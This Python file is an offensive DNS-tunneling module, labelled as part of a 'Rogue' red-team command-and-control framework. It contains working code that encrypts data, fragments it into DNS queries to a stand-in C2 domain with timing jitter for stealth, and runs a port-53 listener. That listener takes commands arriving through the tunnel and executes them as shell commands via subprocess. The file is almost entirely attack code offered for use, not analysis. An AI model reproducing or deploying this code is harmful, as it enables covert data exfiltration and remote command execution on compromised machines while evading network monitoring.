#!/usr/bin/env python3
"""
PAYLOAD: DNS Tunneling Module
DESCRIPTION: Creates covert channel using DNS queries
AUTHOR: Rogue Red Team
VERSION: 3.0 - Integrated with Malleable C2
"""
import dns.resolver, dns.query, dns.message, base64, time, threading, queue
import socket, struct, json, datetime, os, sys, hashlib, random, string
from Cryptodome.Cipher import AES
from typing import Optional, Callable, List, Dict, Any

class DNSFragmenter:
    """
    Lightweight DNS fragmenter for exfiltration.
    Used by both implant and C2 for stealthy data transfer.
    """
    
    def __init__(self, c2_domain: str, encryption_key: bytes = None):
        self.c2_domain = c2_domain
        self.chunk_size = 60  # DNS label max is 63 chars, leave room for metadata
        self.encryption_key = encryption_key or hashlib.sha256(b'RogueDNSTunnel2024').digest()
        self.seen_chunks = {}  # For reconstruction (server side)
        
    def fragment_and_send(self, data: bytes, filename: str = None, session_id: str = None) -> bool:
        """
        Break data into chunks and send via DNS queries.
        Returns True if all chunks sent successfully.
        
        Format: v{seq:04x}.{chunk}.{file_marker}.{session}.{domain}
        - seq: 4-digit hex sequence number
        - chunk: base32 encoded data chunk
        - file_marker: optional filename identifier
        - session: optional session ID for multiple concurrent transfers
        """
        try:
            # Encrypt the data first
            cipher = AES.new(self.encryption_key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(data)
            encrypted = cipher.nonce + tag + ciphertext
            
            # Base32 encode for DNS compatibility
            encoded = base64.b32encode(encrypted).decode().rstrip('=')
            
            # Create file marker if provided
            if filename:
                file_marker = base64.b32encode(filename.encode())[:20].decode().rstrip('=')
            else:
                file_marker = "data"
            
            # Session ID (for multiple concurrent transfers)
            if not session_id:
                session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
            
            # Break into chunks
            chunks = [encoded[i:i+self.chunk_size] 
                     for i in range(0, len(encoded), self.chunk_size)]
            
            success = True
            for i, chunk in enumerate(chunks):
                # Format with sequence number
                query = f"v{i:04x}.{chunk}.{file_marker}.{session_id}.{self.c2_domain}"
                
                # Ensure total length is within DNS limits (253 chars)
                if len(query) > 253:
                    # Split further if needed
                    subchunks = [chunk[j:j+40] for j in range(0, len(chunk), 40)]
                    for j, subchunk in enumerate(subchunks):
                        subquery = f"v{i:04x}s{j:02x}.{subchunk}.{file_marker}.{session_id}.{self.c2_domain}"
                        try:
                            socket.gethostbyname(subquery)
                        except socket.gaierror:
                            # Expected - DNS resolution fails but query was sent
                            pass
                        time.sleep(random.uniform(0.1, 0.3))
                else:
                    try:
                        socket.gethostbyname(query)
                    except socket.gaierror:
                        # Expected - DNS resolution fails but query was sent
                        pass
                
                # Add jitter between queries
                if i < len(chunks) - 1:
                    time.sleep(random.uniform(0.5, 1.5))
            
            return success
            
        except Exception as e:
            print(f"[DNS] Fragment error: {e}")
            return False
    
    def reconstruct_from_chunks(self, chunks: Dict[int, str], session_id: str, file_marker: str) -> Optional[bytes]:
        """
        Reconstruct original data from received chunks.
        Called by C2 DNS listener.
        """
        try:
            # Sort chunks by sequence number
            sorted_chunks = [chunks[i] for i in sorted(chunks.keys())]
            encoded_data = ''.join(sorted_chunks)
            
            # Add padding if needed
            padding = (8 - len(encoded_data) % 8) % 8
            encoded_data += '=' * padding
            
            # Base32 decode
            encrypted = base64.b32decode(encoded_data)
            
            # Decrypt
            nonce, tag, ciphertext = encrypted[:16], encrypted[16:32], encrypted[32:]
            cipher = AES.new(self.encryption_key, AES.MODE_EAX, nonce)
            data = cipher.decrypt_and_verify(ciphertext, tag)
            
            return data
            
        except Exception as e:
            print(f"[DNS] Reconstruction error: {e}")
            return None


class DNSTunnel:
    def __init__(self, domain="rogue-c2.example.com", mode="client", 
                 listen_ip="0.0.0.0", listen_port=53, upstream_dns="8.8.8.8",
                 encryption_key=None):
        self.domain = domain
        self.mode = mode  # "client" or "server"
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.upstream_dns = upstream_dns
        self.encryption_key = encryption_key or hashlib.sha256(b'RogueDNSTunnel2024').digest()
        
        # Initialize fragmenter
        self.fragmenter = DNSFragmenter(domain, self.encryption_key)
        
        # For server-side reconstruction
        self.pending_chunks = {}  # session_id -> {seq: chunk}
        self.pending_metadata = {}  # session_id -> {file_marker, timestamp}
        
        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        self.running = False
        
        self.output_dir = os.path.expanduser("~/.cache/.rogue/dns_tunnel")
        os.makedirs(self.output_dir, exist_ok=True)
    
    def encode_data(self, data: bytes) -> List[str]:
        """Encode data for DNS subdomain (simplified, no fragmentation)"""
        # Encrypt then base32 encode
        cipher = AES.new(self.encryption_key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        encrypted = cipher.nonce + tag + ciphertext
        
        # Base32 encode
        encoded = base64.b32encode(encrypted).decode().rstrip('=')
        
        # Split into DNS label chunks
        return [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    
    def decode_data(self, encoded_data: str) -> Optional[bytes]:
        """Decode data from DNS subdomain"""
        try:
            # Add padding if needed
            encoded = encoded_data.upper()
            padding = (8 - len(encoded) % 8) % 8
            encoded += '=' * padding
            
            # Base32 decode
            encrypted = base64.b32decode(encoded)
            
            # Decrypt
            nonce, tag, ciphertext = encrypted[:16], encrypted[16:32], encrypted[32:]
            cipher = AES.new(self.encryption_key, AES.MODE_EAX, nonce)
            data = cipher.decrypt_and_verify(ciphertext, tag)
            
            return data
        except Exception as e:
            print(f"[DNS] Decode error: {e}")
            return None
    
    def parse_dns_query(self, qname: str) -> Optional[Dict[str, Any]]:
        """
        Parse DNS query and extract components.
        Returns dict with seq, chunk, file_marker, session_id if matches fragment format.
        """
        try:
            # Remove domain suffix
            if not qname.endswith(self.domain):
                return None
            
            subdomain = qname.replace(f'.{self.domain}', '').strip('.')
            parts = subdomain.split('.')
            
            # Check if it's a fragment format (starts with v)
            if parts[0].startswith('v'):
                # Format: v{seq}[s{sub}].{chunk}.{file_marker}.{session_id}
                seq_part = parts[0]
                chunk = parts[1] if len(parts) > 1 else None
                file_marker = parts[2] if len(parts) > 2 else None
                session_id = parts[3] if len(parts) > 3 else None
                
                # Parse sequence number
                if seq_part[1:].find('s') > 0:
                    # Has subchunk
                    main_seq = seq_part[1:seq_part.find('s')]
                    sub_seq = seq_part[seq_part.find('s')+1:]
                    seq = int(main_seq, 16)
                    is_subchunk = True
                    sub_idx = int(sub_seq, 16)
                else:
                    seq = int(seq_part[1:], 16)
                    is_subchunk = False
                    sub_idx = 0
                
                return {
                    'type': 'fragment',
                    'seq': seq,
                    'sub_idx': sub_idx,
                    'is_subchunk': is_subchunk,
                    'chunk': chunk,
                    'file_marker': file_marker,
                    'session_id': session_id
                }
            else:
                # Legacy format - treat as single command
                return {
                    'type': 'command',
                    'data': '.'.join(parts)
                }
                
        except Exception as e:
            print(f"[DNS] Parse error: {e}")
            return None
    
    def send_command(self, command: str, use_fragmentation: bool = False) -> str:
        """Send command via DNS tunnel (client side)"""
        try:
            # Prepare command data
            command_data = json.dumps({
                "type": "command",
                "command": command,
                "timestamp": datetime.datetime.now().isoformat(),
                "id": hashlib.md5(command.encode()).hexdigest()[:8]
            }).encode()
            
            if use_fragmentation:
                # Use fragmenter for better stealth
                session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
                success = self.fragmenter.fragment_and_send(
                    command_data, 
                    filename="cmd", 
                    session_id=session_id
                )
                if success:
                    return "[+] Command fragmented and sent via DNS"
                else:
                    return "[-] Failed to send command via DNS"
            
            else:
                # Legacy method - single query
                chunks = self.encode_data(command_data)
                
                # Build domain
                domain_parts = chunks + [self.domain]
                query_domain = '.'.join(domain_parts)
                
                # Send DNS query
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [self.upstream_dns]
                
                try:
                    response = resolver.resolve(query_domain, 'TXT')
                    txt_data = []
                    for rdata in response:
                        for txt_string in rdata.strings:
                            txt_data.append(txt_string.decode())
                    
                    response_text = ''.join(txt_data)
                    decoded_response = self.decode_data(response_text.encode())
                    
                    if decoded_response:
                        response_data = json.loads(decoded_response.decode())
                        return response_data.get("response", "No response")
                    
                except dns.resolver.NXDOMAIN:
                    return "NXDOMAIN - No such domain"
                except dns.resolver.NoAnswer:
                    return "No answer from DNS"
                except Exception as e:
                    return f"DNS query error: {e}"
            
        except Exception as e:
            return f"[!] Send command error: {e}"
    
    def dns_server(self):
        """Run DNS server for receiving commands and fragments"""
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind((self.listen_ip, self.listen_port))
            sock.settimeout(1)
            
            print(f"[+] DNS server listening on {self.listen_ip}:{self.listen_port}")
            
            while self.running:
                try:
                    data, addr = sock.recvfrom(512)
                    
                    # Parse DNS query
                    request = dns.message.from_wire(data)
                    
                    # Process each question
                    for question in request.question:
                        qname = question.name.to_text().rstrip('.')
                        
                        # Check if it's for our domain
                        if self.domain in qname:
                            print(f"[DNS] Query from {addr[0]}: {qname}")
                            
                            # Parse the query
                            parsed = self.parse_dns_query(qname)
                            
                            if parsed and parsed['type'] == 'fragment':
                                # Handle fragment
                                self._handle_fragment(parsed, addr, request, sock)
                                
                            elif parsed and parsed['type'] == 'command':
                                # Handle legacy command
                                self._handle_command(parsed['data'], addr, request, sock)
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[!] DNS server error: {e}")
                    
        except Exception as e:
            print(f"[!] DNS server failed: {e}")
    
    def _handle_fragment(self, parsed: Dict, addr: tuple, request, sock):
        """Handle incoming DNS fragment"""
        session_id = parsed['session_id']
        seq = parsed['seq']
        chunk = parsed['chunk']
        file_marker = parsed['file_marker']
        
        # Initialize session tracking
        if session_id not in self.pending_chunks:
            self.pending_chunks[session_id] = {}
            self.pending_metadata[session_id] = {
                'file_marker': file_marker,
                'start_time': time.time(),
                'addr': addr[0]
            }
        
        # Store chunk
        self.pending_chunks[session_id][seq] = chunk
        
        print(f"[DNS] Received fragment {seq} for session {session_id}")
        
        # Check if we have all chunks (this is simplified - in real impl,
        # you'd need to know total count from metadata)
        # For now, we'll just acknowledge
        response_data = {
            "type": "fragment_ack",
            "seq": seq,
            "status": "received",
            "timestamp": datetime.datetime.now().isoformat()
        }
        
        # Create response
        response = dns.message.make_response(request)
        txt_response = json.dumps(response_data)
        answer = dns.rrset.from_text(
            request.question[0].name,
            300, 'IN', 'TXT',
            f'"{txt_response}"'
        )
        response.answer.append(answer)
        sock.sendto(response.to_wire(), addr)
    
    def _handle_command(self, data: str, addr: tuple, request, sock):
        """Handle legacy command format"""
        # Try to decode command
        decoded = self.decode_data(data.encode())
        if decoded:
            try:
                command_data = json.loads(decoded.decode())
                if command_data.get("type") == "command":
                    # Put command in queue
                    self.command_queue.put({
                        "command": command_data.get("command"),
                        "client": addr[0],
                        "timestamp": command_data.get("timestamp")
                    })
                    
                    # Create response
                    response_data = {
                        "type": "response",
                        "status": "received",
                        "timestamp": datetime.datetime.now().isoformat()
                    }
                    
                    # Encode response
                    response_encoded = self.encode_data(json.dumps(response_data).encode())
                    response_txt = ''.join(response_encoded)
                    
                    # Build DNS response
                    response = dns.message.make_response(request)
                    answer = dns.rrset.from_text(
                        request.question[0].name,
                        300, 'IN', 'TXT',
                        f'"{response_txt}"'
                    )
                    response.answer.append(answer)
                    sock.sendto(response.to_wire(), addr)
                    
            except json.JSONDecodeError:
                pass
    
    def command_handler(self):
        """Handle incoming commands"""
        while self.running:
            try:
                command_data = self.command_queue.get(timeout=1)
                if command_data:
                    print(f"[+] Received command: {command_data['command']}")
                    
                    # Execute command
                    import subprocess
                    try:
                        result = subprocess.check_output(
                            command_data['command'],
                            shell=True,
                            stderr=subprocess.STDOUT,
                            timeout=30
                        ).decode()
                    except subprocess.CalledProcessError as e:
                        result = e.output.decode()
                    except subprocess.TimeoutExpired:
                        result = "Command timed out after 30 seconds"
                    
                    # Store result for later exfiltration
                    self.response_queue.put({
                        "command": command_data['command'],
                        "result": result,
                        "client": command_data['client'],
                        "timestamp": command_data['timestamp']
                    })
                    
            except queue.Empty:
                continue
            except Exception as e:
                print(f"[!] Command handler error: {e}")
    
    def start_server(self):
        """Start DNS tunnel server"""
        print(f"[+] Starting DNS tunnel server for domain: {self.domain}")
        self.running = True
        
        # Start DNS server thread
        dns_thread = threading.Thread(target=self.dns_server, daemon=True)
        dns_thread.start()
        
        # Start command handler thread
        handler_thread = threading.Thread(target=self.command_handler, daemon=True)
        handler_thread.start()
        
        try:
            while self.running:
                time.sleep(1)
                
                # Periodically clean up old sessions
                self._cleanup_old_sessions()
                
        except KeyboardInterrupt:
            print("[+] Stopping DNS tunnel server...")
        finally:
            self.stop()
    
    def _cleanup_old_sessions(self, max_age=300):
        """Remove sessions older than max_age seconds"""
        now = time.time()
        expired = []
        for session_id, metadata in self.pending_metadata.items():
            if now - metadata['start_time'] > max_age:
                expired.append(session_id)
        
        for session_id in expired:
            del self.pending_chunks[session_id]
            del self.pending_metadata[session_id]
    
    def start_client(self, command=None, use_fragmentation=True):
        """Start DNS tunnel client"""
        if command:
            # Send single command
            print(f"[+] Sending command via DNS: {command}")
            response = self.send_command(command, use_fragmentation)
            print(f"[+] Response: {response}")
            return response
        else:
            # Interactive mode
            print(f"[+] Starting DNS tunnel client to domain: {self.domain}")
            print(f"[+] Fragmentation mode: {'ON' if use_fragmentation else 'OFF'}")
            print("[+] Enter commands to send via DNS (or 'exit' to quit)")
            
            while True:
                try:
                    cmd = input("DNS> ").strip()
                    if cmd.lower() in ['exit', 'quit']:
                        break
                    
                    if cmd.startswith('frag '):
                        # Toggle fragmentation
                        use_fragmentation = not use_fragmentation
                        print(f"[+] Fragmentation mode: {'ON' if use_fragmentation else 'OFF'}")
                    elif cmd:
                        response = self.send_command(cmd, use_fragmentation)
                        print(f"[+] Response: {response}")
                        
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"[!] Error: {e}")
    
    def stop(self):
        """Stop DNS tunnel"""
        self.running = False
    
    def execute(self, mode=None, command=None, use_fragmentation=True):
        """Execute DNS tunnel based on mode"""
        mode = mode or self.mode
        
        if mode == "server":
            self.start_server()
            return "[+] DNS tunnel server started"
        elif mode == "client":
            result = self.start_client(command, use_fragmentation)
            return json.dumps({"command": command, "response": result}, indent=2)
        else:
            return f"[!] Unknown mode: {mode}"

def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Rogue DNS Tunnel')
    parser.add_argument('--mode', choices=['client', 'server'], default='client', help='Tunnel mode')
    parser.add_argument('--domain', default='rogue-c2.example.com', help='Domain for DNS tunnel')
    parser.add_argument('--command', help='Command to execute (client mode only)')
    parser.add_argument('--listen-ip', default='0.0.0.0', help='Listen IP (server mode)')
    parser.add_argument('--listen-port', type=int, default=53, help='Listen port (server mode)')
    parser.add_argument('--upstream-dns', default='8.8.8.8', help='Upstream DNS server (client mode)')
    parser.add_argument('--no-frag', action='store_true', help='Disable fragmentation (use legacy mode)')
    
    args, unknown = parser.parse_known_args()
    
    tunnel = DNSTunnel(
        domain=args.domain,
        mode=args.mode,
        listen_ip=args.listen_ip,
        listen_port=args.listen_port,
        upstream_dns=args.upstream_dns
    )
    
    return tunnel.execute(
        mode=args.mode, 
        command=args.command,
        use_fragmentation=not args.no_frag
    )

# Export for C2 integration
__all__ = ['DNSTunnel', 'DNSFragmenter', 'rogue_integration']

if __name__ == "__main__":
    print(rogue_integration())
